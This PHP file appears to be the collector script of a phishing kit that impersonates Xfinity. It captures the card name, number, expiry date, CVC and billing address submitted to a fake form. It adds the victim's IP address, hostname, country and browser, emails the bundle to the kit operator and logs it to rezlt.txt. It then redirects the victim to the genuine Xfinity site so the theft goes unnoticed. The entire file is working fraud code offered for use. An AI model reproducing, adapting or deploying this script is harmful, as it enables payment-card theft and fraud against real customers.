<?php
include('email.php');
if(($_POST['cardname'] !="")){
	# code...
$adddate=date("D M d, Y g:i a");
$zabi = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$zabi));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$hostname = gethostbyaddr($zabi);
$message .= "--++-----[ $$ Xfinity $$ ]-----++--\n";
$message .= "--------------  CARD Xfinity-------------\n";
$message .= "|Card Name : ".$_POST['cardname']."\n";
$message .= "|Card Number : ".$_POST['cardnumber']."\n";
$message .= "|Card Exp Date : ".$_POST['expdate']."\n";
$message .= "|Card CVC : ".$_POST['cvc']."\n";
$message .= "|Address : ".$_POST['address']."\n";
$message .= "|City : ".$_POST['city']."\n";
$message .= "|State : ".$_POST['state']."\n";
$message .= "|ZIP Code : ".$_POST['zipcode']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "Hostname       : $hostname\n";
$message .= "Country       : $country\n";
$message .= "Ip link   http://www.geoiptool.com/?IP=$zabi ----\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- $$ By Anonymous $$ ----------------------\n";
$subject = "Xfinity[ " . $zabi . " ]";
$headers = "From: Anonymous <contact>\r\n";
mail($email,$subject,$message,$headers);

    $text = fopen('rezlt.txt', 'a');
fwrite($text, $message);
header("Location: https://my.xfinity.com/");
 
}
else{
	header ("Location: index.php");
}

?>